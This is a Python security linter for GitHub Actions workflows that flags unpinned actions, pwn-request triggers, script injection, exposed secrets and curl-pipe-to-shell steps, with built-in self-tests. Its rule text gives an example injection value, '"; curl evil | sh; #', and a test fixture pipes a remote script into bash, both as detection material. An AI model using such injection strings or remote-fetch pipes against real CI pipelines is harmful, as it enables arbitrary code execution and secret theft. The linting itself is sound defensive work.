#!/usr/bin/env python3
"""actions-guard: a security linter for GitHub Actions workflows.

Scans `.github/workflows/*.yml` for the CI supply-chain and injection mistakes
that turn a workflow into an attacker's foothold:

  * third-party actions pinned to a mutable tag/branch instead of a commit SHA,
  * `pull_request_target` / `workflow_run` workflows that check out and run
    untrusted PR code with secrets available ("pwn request"),
  * script injection — attacker-controlled `${{ github.event.* }}` /
    `github.head_ref` interpolated directly into a `run:` shell,
  * secrets interpolated into `run:` instead of passed via `env:`,
  * remote scripts piped into a shell, and hard-coded credentials.

Design goals:
  * Pure Python standard library (no PyYAML) — a light, indentation-aware scan.
  * Deterministic and CI-friendly (non-zero exit at/above --fail-on).

Usage:
    analyze_workflow.py FILE [FILE ...]         # lint workflow files
    analyze_workflow.py DIR                      # find .github/workflows/*.yml
    analyze_workflow.py --json FILE
    analyze_workflow.py --fail-on medium DIR
    analyze_workflow.py --selftest

Exit codes: 0 clean, 1 findings at/above threshold, 2 usage error.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
from dataclasses import dataclass, asdict
from typing import Iterable

SEVERITY_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
SEVERITY_LABEL = {k: k.upper() for k in SEVERITY_ORDER}

# Attacker-controlled expression contexts that are unsafe inside `run:`.
DANGEROUS_CONTEXT = re.compile(
    r"\$\{\{[^}]*\b(?:"
    r"github\.head_ref|"
    r"github\.event\.(?:"
    r"issue\.(?:title|body)|"
    r"pull_request\.(?:title|body|head\.ref|head\.label)|"
    r"comment\.body|review\.body|review_comment\.body|"
    r"head_commit\.message|commits\b|"
    r"discussion\.(?:title|body)|"
    r"pages\b|inputs\b"
    r")"
    r")[^}]*\}\}",
    re.IGNORECASE,
)
SECRET_LITERAL = re.compile(
    r"""(['"]?)(gh[posru]_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{12,}|"""
    r"""xox[baprs]-[A-Za-z0-9-]{10,}|-----BEGIN [A-Z ]*PRIVATE KEY-----)\1"""
)
FULL_SHA = re.compile(r"^[0-9a-f]{40}$")


@dataclass
class Finding:
    rule: str
    severity: str
    title: str
    detail: str
    fix: str
    file: str = ""
    line: int = 0
    snippet: str = ""

    def sort_key(self) -> tuple:
        return (-SEVERITY_ORDER[self.severity], self.file, self.line, self.rule)


def _snip(text: str, limit: int = 140) -> str:
    s = re.sub(r"\s+", " ", text).strip()
    return s if len(s) <= limit else s[: limit - 3] + "..."


def _indent(line: str) -> int:
    return len(line) - len(line.lstrip(" "))


def analyze_text(text: str, file: str) -> list[Finding]:
    lines = text.split("\n")
    findings: list[Finding] = []

    def add(rule, sev, title, detail, fix, line, snippet=""):
        findings.append(Finding(rule, sev, title, detail, fix, file, line, snippet))

    low_all = text.lower()
    has_permissions = bool(re.search(r"^\s*permissions:\s*", text, re.MULTILINE))
    uses_pr_target = bool(re.search(r"\b(pull_request_target|workflow_run)\b", low_all))
    checks_out_head = bool(re.search(
        r"ref:\s*\$\{\{[^}]*(github\.event\.pull_request\.head|github\.head_ref)",
        text, re.IGNORECASE))

    # --- file-level rules ---
    if uses_pr_target and checks_out_head:
        m = re.search(r"^\s*(pull_request_target|workflow_run):", text, re.MULTILINE)
        ln = text[: m.start()].count("\n") + 1 if m else 1
        add("GHA002", "critical", "pull_request_target checks out untrusted PR code",
            "A `pull_request_target` / `workflow_run` workflow runs with repo "
            "secrets and a write token, and here it checks out the PR head — so a "
            "fork PR can run its own code with your secrets (a 'pwn request').",
            "Don't check out and build untrusted PR code in a privileged trigger. "
            "Use `pull_request` for build/test, and if you need labels/comments, "
            "keep the privileged job separate and never run PR-controlled code.",
            ln, "on: pull_request_target + checkout of PR head")

    if not has_permissions:
        add("GHA004", "medium", "No permissions: block — token defaults to broad scope",
            "Without an explicit `permissions:` key, the `GITHUB_TOKEN` gets the "
            "repository/organization default, often read-write to everything.",
            "Add a top-level `permissions:` set to least privilege (e.g. "
            "`permissions: {contents: read}`) and widen per-job only as needed.",
            1, "")

    for m in SECRET_LITERAL.finditer(text):
        ln = text[: m.start()].count("\n") + 1
        add("GHA008", "critical", "Hard-coded credential in workflow",
            "A token/key/private-key literal is committed in the workflow file.",
            "Move it to an encrypted repository/environment secret and reference "
            "`${{ secrets.NAME }}`; rotate the exposed credential.",
            ln, "<redacted credential literal>")

    # --- line/block rules ---
    i = 0
    n = len(lines)
    while i < n:
        raw = lines[i]
        line = raw.rstrip("\n")
        stripped = line.strip()
        lineno = i + 1

        # uses: action pinning
        um = re.match(r"\s*-?\s*uses:\s*(['\"]?)([^\s'\"]+)\1", line)
        if um:
            ref = um.group(2)
            if not ref.startswith("./") and not ref.startswith(".\\") \
                    and not ref.startswith("docker://") and "@" in ref:
                action, _, version = ref.partition("@")
                if not FULL_SHA.match(version):
                    official = action.split("/")[0].lower() in ("actions", "github")
                    sev = "medium" if official else "high"
                    add("GHA001", sev, "Action pinned to a mutable ref, not a commit SHA",
                        f"`{ref}` is pinned to a tag/branch. Tags are mutable — the "
                        "owner (or an attacker who compromises them) can move `"
                        f"{version}` to malicious code that then runs in your CI.",
                        f"Pin to a full 40-char commit SHA: `{action}@<sha>  # {version}`. "
                        + ("(Even first-party actions are safer SHA-pinned.)"
                           if official else ""),
                        lineno, _snip(stripped))
            i += 1
            continue

        # run: blocks (inline or block scalar)
        rm = re.match(r"(\s*)(-?\s*)run:\s*(\|>?[+-]?|>[+-]?)?\s*(.*)$", line)
        if rm:
            base_indent = _indent(line)
            scalar = (rm.group(3) or "").strip()
            inline = rm.group(4)
            block_lines: list[tuple[int, str]] = []
            if scalar in ("|", ">", "|-", ">-", "|+", ">+"):
                j = i + 1
                while j < n:
                    bl = lines[j]
                    if bl.strip() == "":
                        block_lines.append((j + 1, bl))
                        j += 1
                        continue
                    if _indent(bl) <= base_indent:
                        break
                    block_lines.append((j + 1, bl))
                    j += 1
                i = j
            else:
                if inline:
                    block_lines.append((lineno, inline))
                i += 1
            _scan_run(block_lines, add)
            continue

        i += 1

    findings.sort(key=lambda x: x.sort_key())
    return findings


def _scan_run(block_lines: list[tuple[int, str]], add) -> None:
    seen = {"GHA003": False, "GHA005": False, "GHA007": False}
    for lineno, content in block_lines:
        if not seen["GHA003"] and DANGEROUS_CONTEXT.search(content):
            seen["GHA003"] = True
            add("GHA003", "high", "Script injection: untrusted input in a run: shell",
                "An attacker-controlled expression (e.g. a PR title, branch name, or "
                "issue body) is interpolated straight into the shell. A crafted value "
                "like `\"; curl evil | sh; #` runs arbitrary commands in your CI.",
                "Never interpolate `github.event.*` / `github.head_ref` into `run:`. "
                "Bind it to an `env:` variable and reference it quoted "
                "(`\"$TITLE\"`), so the value can't break out of the string.",
                lineno, _snip(content))
        if not seen["GHA005"] and re.search(r"\$\{\{\s*secrets\.", content, re.IGNORECASE):
            seen["GHA005"] = True
            add("GHA005", "medium", "Secret interpolated directly into run:",
                "Interpolating `${{ secrets.* }}` into the script bakes the secret "
                "into the command line (visible in process listings / logs on error) "
                "and risks injection if combined with untrusted input.",
                "Pass secrets via `env:` on the step (`env: {TOKEN: ${{ secrets.TOKEN }}}`) "
                "and reference `\"$TOKEN\"` in the script.",
                lineno, _snip(content))
        if not seen["GHA007"] and re.search(
                r"\b(curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba)?sh\b", content, re.IGNORECASE):
            seen["GHA007"] = True
            add("GHA007", "high", "Remote script piped into a shell",
                "`curl ... | sh` in CI executes unreviewed, unpinned remote code with "
                "your workflow's privileges — a supply-chain foothold.",
                "Download to a file, verify a checksum/signature, then run it; or use a "
                "SHA-pinned action instead.",
                lineno, _snip(content))


# --------------------------------------------------------------------------- #
# File / directory handling
# --------------------------------------------------------------------------- #


def is_workflow(path: str) -> bool:
    p = path.replace("\\", "/")
    return ("/.github/workflows/" in p or p.startswith(".github/workflows/")) \
        and p.endswith((".yml", ".yaml"))


def analyze_file(path: str) -> list[Finding]:
    if path == "-":
        return analyze_text(sys.stdin.read(), "<stdin>")
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        return analyze_text(fh.read(), path)


def iter_workflows(root: str) -> Iterable[str]:
    wf = os.path.join(root, ".github", "workflows")
    if os.path.isdir(wf):
        for name in sorted(os.listdir(wf)):
            if name.endswith((".yml", ".yaml")):
                yield os.path.join(wf, name)


def collect_findings(paths: list[str]) -> list[Finding]:
    findings: list[Finding] = []
    for path in paths:
        if path != "-" and os.path.isdir(path):
            for fp in iter_workflows(path):
                findings.extend(analyze_file(fp))
        else:
            findings.extend(analyze_file(path))
    findings.sort(key=lambda x: x.sort_key())
    return findings


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #


def render_text(findings: list[Finding], threshold: str) -> str:
    if not findings:
        return "actions-guard: no issues detected. ✓"
    counts: dict[str, int] = {}
    for x in findings:
        counts[x.severity] = counts.get(x.severity, 0) + 1
    summary = ", ".join(f"{counts[s]} {s}" for s in
                        ["critical", "high", "medium", "low", "info"] if counts.get(s))
    out = [f"actions-guard found {len(findings)} issue(s): {summary}\n"]
    for x in findings:
        loc = f"{x.file}:{x.line}" if x.line else x.file
        out.append(f"[{SEVERITY_LABEL[x.severity]}] {x.rule}  {x.title}")
        out.append(f"  at {loc}")
        if x.snippet:
            out.append(f"  > {x.snippet}")
        out.append(f"  why: {x.detail}")
        out.append(f"  fix: {x.fix}")
        out.append("")
    gate = SEVERITY_ORDER[threshold]
    worst = max((SEVERITY_ORDER[x.severity] for x in findings), default=-1)
    out.append(f"FAIL: findings at or above '{threshold}'." if worst >= gate
               else f"OK: no findings at or above '{threshold}' (advisory items only).")
    return "\n".join(out)


def render_json(findings: list[Finding], threshold: str) -> str:
    gate = SEVERITY_ORDER[threshold]
    worst = max((SEVERITY_ORDER[x.severity] for x in findings), default=-1)
    return json.dumps({
        "tool": "actions-guard",
        "threshold": threshold,
        "passed": worst < gate,
        "count": len(findings),
        "findings": [asdict(x) for x in findings],
    }, indent=2)


# --------------------------------------------------------------------------- #
# Self-test
# --------------------------------------------------------------------------- #

SELFTEST_POSITIVE = [
    ("on: push\npermissions: {contents: read}\njobs:\n  b:\n    steps:\n"
     "      - uses: actions/checkout@v4\n", "GHA001"),
    ("on: pull_request_target\npermissions: {contents: read}\njobs:\n  b:\n    steps:\n"
     "      - uses: actions/checkout@abcdef1234567890abcdef1234567890abcdef12\n"
     "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n", "GHA002"),
    ("on: issues\npermissions: {contents: read}\njobs:\n  b:\n    steps:\n"
     "      - run: echo \"${{ github.event.issue.title }}\"\n", "GHA003"),
    ("on: push\njobs:\n  b:\n    steps:\n      - run: echo hi\n", "GHA004"),
    ("on: push\npermissions: {contents: read}\njobs:\n  b:\n    steps:\n"
     "      - run: curl -sSL https://x.sh | bash\n", "GHA007"),
    ("on: push\npermissions: {contents: read}\njobs:\n  b:\n    steps:\n"
     "      - run: deploy --token ${{ secrets.DEPLOY_TOKEN }}\n", "GHA005"),
    ("on: push\npermissions: {contents: read}\nenv:\n  T: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345\n",
     "GHA008"),
]

SELFTEST_NEGATIVE = [
    "on: push\npermissions: {contents: read}\njobs:\n  b:\n    steps:\n"
    "      - uses: actions/checkout@abcdef1234567890abcdef1234567890abcdef12\n"
    "      - run: echo hello\n",
    "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    steps:\n"
    "      - name: safe\n        env:\n          TITLE: ${{ github.event.issue.title }}\n"
    "        run: echo \"$TITLE\"\n",
    "on: pull_request\npermissions: {contents: read}\njobs:\n  b:\n    steps:\n"
    "      - uses: actions/checkout@abcdef1234567890abcdef1234567890abcdef12\n",
]


def run_selftest() -> int:
    failures = 0
    for src, expected in SELFTEST_POSITIVE:
        rules = {x.rule for x in analyze_text(src, "wf.yml")}
        if expected not in rules:
            failures += 1
            print(f"  MISS: expected {expected} -> {sorted(rules)}\n    src={src!r}")
    for src in SELFTEST_NEGATIVE:
        bad = [x.rule for x in analyze_text(src, "wf.yml")
               if x.severity in ("high", "critical")]
        if bad:
            failures += 1
            print(f"  FALSE POSITIVE: {bad}\n    src={src!r}")
    if failures:
        print(f"selftest: {failures} failure(s)")
        return 1
    print(f"selftest: all {len(SELFTEST_POSITIVE)} positive and "
          f"{len(SELFTEST_NEGATIVE)} negative cases passed ✓")
    return 0


def main(argv: list[str]) -> int:
    p = argparse.ArgumentParser(
        prog="analyze_workflow.py",
        description="Security linter for GitHub Actions workflows.")
    p.add_argument("paths", nargs="*", help="workflow files or a repo root, or - for stdin")
    p.add_argument("--json", action="store_true", help="emit JSON output")
    p.add_argument("--fail-on", default="high", choices=list(SEVERITY_ORDER),
                   help="minimum severity that causes a non-zero exit (default: high)")
    p.add_argument("--selftest", action="store_true", help="run built-in checks")
    args = p.parse_args(argv)

    if args.selftest:
        return run_selftest()
    if not args.paths:
        p.print_usage()
        print("error: provide a workflow file or a repo root (or - for stdin)",
              file=sys.stderr)
        return 2
    for path in args.paths:
        if path != "-" and not os.path.exists(path):
            print(f"error: path not found: {path}", file=sys.stderr)
            return 2

    findings = collect_findings(args.paths)
    print(render_json(findings, args.fail_on) if args.json
          else render_text(findings, args.fail_on))
    gate = SEVERITY_ORDER[args.fail_on]
    worst = max((SEVERITY_ORDER[x.severity] for x in findings), default=-1)
    return 1 if worst >= gate else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
